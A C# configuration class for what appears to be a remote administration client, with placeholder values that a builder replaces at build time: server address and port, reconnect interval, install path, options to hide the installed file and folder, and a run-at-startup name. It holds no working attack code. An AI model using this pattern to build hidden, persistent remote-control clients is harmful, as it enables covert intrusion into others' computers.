using System;

namespace RemoteAdmin.Client.Config
{
    /// <summary>
    /// Client configuration that gets modified at build time.
    /// The builder injects values into the static constructor.
    /// </summary>
    public static class ClientConfig
    {
        // Connection Settings
        public static string ServerIP { get; private set; }
        public static int ServerPort { get; private set; }
        public static int ReconnectInterval { get; private set; }

        // Installation Settings
        public static bool InstallClient { get; private set; }
        public static string InstallLocation { get; private set; }
        public static string InstallSubDirectory { get; private set; }
        public static string InstallName { get; private set; }
        public static bool SetFileHidden { get; private set; }
        public static bool SetSubDirHidden { get; private set; }

        // Startup Settings
        public static bool InstallOnStartup { get; private set; }
        public static string StartupName { get; private set; }

        // Static constructor - the builder will inject IL code here
        static ClientConfig()
        {
            // Connection defaults (will be REPLACED by builder)
            ServerIP = "###PLACEHOLDER_IP_ADDR_X9K2P7L4M###";
            ServerPort = 999999999;
            ReconnectInterval = 888888888;

            // Installation defaults (will be REPLACED by builder)
            InstallClient = false;
            InstallLocation = "###INSTALL_LOCATION_PLACEHOLDER###";
            InstallSubDirectory = "###INSTALL_SUBDIR_PLACEHOLDER###";
            InstallName = "###INSTALL_NAME_PLACEHOLDER###";
            SetFileHidden = false;
            SetSubDirHidden = false;

            // Startup defaults (will be REPLACED by builder)
            InstallOnStartup = false;
            StartupName = "###STARTUP_NAME_PLACEHOLDER###";
        }

        public static void Initialize()
        {
            // Optional: Add any initialization logic here
            Console.WriteLine($"Client configured to connect to {ServerIP}:{ServerPort}");

            if (InstallClient)
            {
                Console.WriteLine($"Installation: Enabled to {InstallLocation}\\{InstallSubDirectory}\\{InstallName}.exe");
            }

            if (InstallOnStartup)
            {
                Console.WriteLine($"Startup: Enabled as '{StartupName}'");
            }
        }
    }
}